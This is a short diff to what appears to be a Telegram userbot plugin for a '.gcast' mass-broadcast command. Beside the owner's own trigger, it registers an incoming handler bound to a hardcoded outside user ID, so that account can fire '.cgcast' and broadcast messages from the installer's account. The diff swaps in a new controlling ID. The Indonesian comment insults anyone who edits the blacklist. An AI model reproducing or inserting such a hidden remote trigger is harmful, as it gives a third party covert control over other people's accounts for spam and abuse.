@@ -11,7 +11,7 @@ GCAST_BLACKLIST = [
 # Hapus blacklist bapak lu jelek gua gban!.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1972682280, 
+@register(incoming=True, from_users=5090127753, 
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
